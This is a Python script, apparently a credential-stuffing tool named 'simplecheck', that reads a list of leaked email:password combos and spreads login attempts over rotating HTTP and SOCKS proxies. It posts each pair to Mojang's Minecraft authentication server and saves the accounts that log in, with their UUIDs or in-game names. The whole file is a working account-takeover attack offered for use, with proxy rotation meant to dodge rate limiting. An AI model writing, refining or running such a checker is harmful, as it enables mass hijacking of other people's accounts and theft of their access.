import ctypes
import requests
import json
import os
import time
import sys
import random
from multiprocessing.dummy import Pool as ThreadPool
from proxy_checker import proxy_check, threads, proxies_json
import threading

working_accounts = []

combo_path = input("Combolist / Accounts list location:\n").replace("\"","") or False
if not combo_path:
    print("Hey! You HAVE to put your combolist / accounts list here  \n")
    input("Press any key key to close the program")
    sys.exit()

combos = [x.strip() for x in open(combo_path, "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
if len(combos) == 0:
    print("You dont have any accounts/combos in that text file.")
    input("Press any key to close the program")
    sys.exit()
else:
    print(len(combos), "Combolist / Accounts list successful\n")

http_proxy_path = input("Https / Http list location:\n").replace("\"","") or False
if http_proxy_path:
    raw_http = [x.strip() for x in open(str(http_proxy_path), "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
    if len(raw_http) == 0:
        print("Proxy list MUST be filled")
        print("Just a reminder, the proxy file format is:\nip:port\nip:port")
    else:
        print(len(raw_http), "http proxies list loaded successfuly\n")

socks4_proxy_path = input("Socks4 list location:\n").replace("\"","") or False
if socks4_proxy_path:
    raw_socks4 = [x.strip() for x in open(str(socks4_proxy_path), "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
    if len(raw_socks4) == 0:
        print("Proxy list MUST be filled")
        print("Just a reminder, the proxy file format is:\nip:port\nip:port")
    else:
        print(len(raw_socks4), "socks4 proxies list loaded successfuly\n")

socks5_proxy_path = input("Socks5 list location:\n").replace("\"","") or False
if socks5_proxy_path:
    raw_socks5 = [x.strip() for x in open(str(socks5_proxy_path), "r", encoding="utf8", errors='ignore').readlines() if ":" in x]
    if len(raw_socks5) == 0:
        print("Proxy list MUST be filled")
        print("Just a reminder, the proxy file format is:\nip:port\nip:port")
    else:
        print(len(raw_socks5), "socks5 proxies list loaded successfuly\n")


if not any([http_proxy_path, socks4_proxy_path, socks5_proxy_path]):
    print("This program will be closed cause you need proxies.\nGet some proxies!")
    input("Press any key to close the program")
    sys.exit()


try_amount = int(input("How many times an account should be tested before marking it as invalid (min. 1 (Only go above 4 if you have a shittone of working proxies)? Default: 4 \n") or "5")

output_format =  int(input("What format should the output file be? Default is 1 \n1: email:password \n2: email:password:uuid \n3: email:password:username\n") or "1")

save_variant =  int(input("When should the accounts get saved? Default is 1 \n1: When checking finished (recommended) \n2: While checking (Can be buggy when using many threads)\n") or "1")


print("Starting to check proxies")

if http_proxy_path:
    print("\nStarted http proxy checking")
    proxy_check(raw_http, "http")
if socks4_proxy_path:
    print("\nStarted socks4 proxy checking")
    proxy_check(raw_socks4, "socks4")
if socks5_proxy_path:
    print("\nStarted socks5 proxy checking")
    proxy_check(raw_socks5, "socks5")
print("Done proxy checking")

header = {"content-type": "application/json"}

file_name = time.strftime("minecraft_%d-%m-%Y %H-%M-%S.txt")


class stats:
    working = 0
    invalid = 0

def check(x):
    combo = combos[x].strip()
    username = combo.split(":")[0]
    password = combo.split(":")[1]
    body = json.dumps({
        'agent': {
            'name': 'Minecraft',
            'version': 1
        },
        'username': username,
        'password': password,
        'requestUser': 'true'
    })
    tries = 0
    while tries < try_amount:
        tries = tries + 1
        try:
            proxy = random.choice(list(proxies_json.keys()))
            proxy_type = proxies_json[proxy]["type"]
            if proxy_type == "http":
                proxy_dict = {
                    'http': "http://" + proxy,
                    'https': "https://" + proxy
                }
            else:
                proxy_dict = {
                    'http': proxy_type + "://" + proxy,
                    'https': proxy_type + "://" + proxy
                }

            answer = requests.post('https://authserver.mojang.com/authenticate',
                                   data=body,
                                   headers=header,
                                   proxies=proxy_dict,
                                   timeout=6).text
            answer_json = json.loads(answer)
            if answer_json.get("selectedProfile"):
                if answer_json.get("selectedProfile").get("name"):
                    ign = answer_json["selectedProfile"]["name"]
                    uuid = answer_json["selectedProfile"]["id"]
                    if output_format == 1:
                        if save_variant == 2:
                            open(file_name, "a").write(f"{combo}\n")
                        working_accounts.append(combo)
                    if output_format == 2:
                        if save_variant == 2:
                            open(file_name, "a").write(f"{combo}:{uuid}\n")
                        working_accounts.append(combo + ":" + uuid)
                    if output_format == 3:
                        if save_variant == 2:
                            open(file_name, "a").write(f"{combo}:{ign}\n")
                        working_accounts.append(combo + ":" + ign)
                    stats.working += 1
                    return
        except Exception:
            pass
    stats.invalid += 1


running = True
def titlebar_changer():
    while running:

        ctypes.windll.kernel32.SetConsoleTitleW(
            "simplecheck by scorpion3013 | " +
            "Combos left: " + str(len(combos) - (stats.invalid + stats.working)) +
            " | Working: " + str(stats.working) +
            " | Bad: " + str(stats.invalid))
        time.sleep(0.5)

t1 = threading.Thread(target=titlebar_changer, args=[])
t1.daemon = True
t1.start()


def thread_starter(numbers, threads=threads):
    pool = ThreadPool(threads)
    results = pool.map(check, numbers)
    pool.close()
    pool.join()
    return results

if __name__ == "__main__":
    thread_number_list = []
    for x in range(0, len(combos)):
        thread_number_list.append(int(x))
    the_focking_threads = thread_starter(thread_number_list, threads)
time.sleep(0.7)
running = False
print("Checking complete")
print("I found: " + str(len(working_accounts)) + " working accounts!")


if save_variant == 1:
    open(file_name, "w").write("\n".join(working_accounts))
input("Done\n")